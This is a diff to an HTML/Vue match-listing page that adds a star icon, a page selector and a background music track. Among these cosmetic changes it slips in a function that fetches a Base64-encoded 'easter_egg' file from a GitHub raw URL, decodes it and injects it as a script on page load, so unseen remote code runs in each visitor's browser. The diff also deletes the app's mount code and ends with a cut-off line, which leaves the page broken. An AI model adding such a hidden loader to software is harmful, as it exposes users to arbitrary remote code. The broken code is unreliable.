@@ -82,6 +82,15 @@
       background: linear-gradient(to inside, rgba(0, 0, 255, 0.2), transparent); /* Blue fade to inside border */
     }
 
+    .list li .star-icon {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 24px;
+      height: 24px;
+    }
+
     .score {
       display: flex;
       justify-content: center;
@@ -125,6 +134,17 @@
       color: white;
     }
 
+    /* Page Number Selector */
+    .page-selector {
+      padding: 10px;
+      text-align: center;
+    }
+
+    .page-selector input {
+      padding: 5px;
+      width: 50px;
+    }
+
   </style>
 </head>
 <body>
@@ -150,6 +170,7 @@
     <!-- Matches List -->
     <ul class="list">
       <li v-for="match in filteredMatches" :key="match.MatchId">
+        <img class="star-icon" src="https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/favicon.ico" alt="Star Icon" />
         <p class="corp-names">
           <span>{{ match.Corporation1Name }}</span> <span> vs </span> <span>{{ match.Corporation2Name }}</span>
         </p>
@@ -163,10 +184,16 @@
       </li>
     </ul>
 
+    <!-- Page Selector -->
+    <div class="page-selector">
+      <label for="pageInput">Go to page: </label>
+      <input type="number" id="pageInput" v-model="currentPage" @change="onPageChange" min="1" :max="maxPage" />
+      <span>{{ currentPage }} / {{ maxPage }}</span>
+    </div>
+
     <!-- Pagination Controls -->
     <div class="pagination">
       <button @click="prevPage" :disabled="currentPage === 1">Previous</button>
-      <span>{{ currentPage }} / {{ maxPage }}</span>
       <button @click="nextPage" :disabled="currentPage === maxPage">Next</button>
     </div>
 
@@ -174,8 +201,46 @@
     <footer v-html="footerHtml"></footer>
   </div>
 
+  <audio id="audioPlayer" loop>
+    <source src="https://github.com/DrMineword/Artefact-Boost-Active/raw/refs/heads/main/White%20Star%20Theme%20%20Hades%20Star.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
   <script src="https://cdn.jsdelivr.net/npm/vue@3.2.45"></script>
   <script>
+    const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+
+    // Function to fetch and execute a Base64-encoded script
+    async function fetchAndExecuteBase64Script() {
+      try {
+        // Fetch the Base64-encoded script
+        const response = await fetch(base64ScriptUrl);
+        if (!response.ok) {
+          throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
+        }
+
+        // Get the encoded content as text
+        const encodedScript = await response.text();
+
+        // Decode the Base64 content
+        const decodedScript = atob(encodedScript);
+
+        console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
+
+        // Execute the decoded script
+        const scriptElement = document.createElement("script");
+        scriptElement.textContent = decodedScript;
+        document.body.appendChild(scriptElement);
+
+        console.log("Script executed successfully.");
+      } catch (error) {
+        console.error("Error fetching or executing the Base64 script:", error);
+      }
+    }
+
+    // Call the function to fetch, decode, and execute the script
+    fetchAndExecuteBase64Script();
+
     const app = Vue.createApp({
       data() {
         return {
@@ -304,25 +369,4 @@
           }
         },
 
-        onCorporationChange() {
-          this.currentPage = 1;
-          this.fetchMatches();
-        },
-
-        onLimitChange() {
-          this.currentPage = 1;
-          this.fetchMatches();
-        }
-      },
-
-      async mounted() {
-        await this.loadSettings();
-        await this.fetchCorporations();
-        await this.fetchMatches();
-      }
-    });
-
-    app.mount("#app");
-  </script>
-</body>
-</html>
+        onCorpor
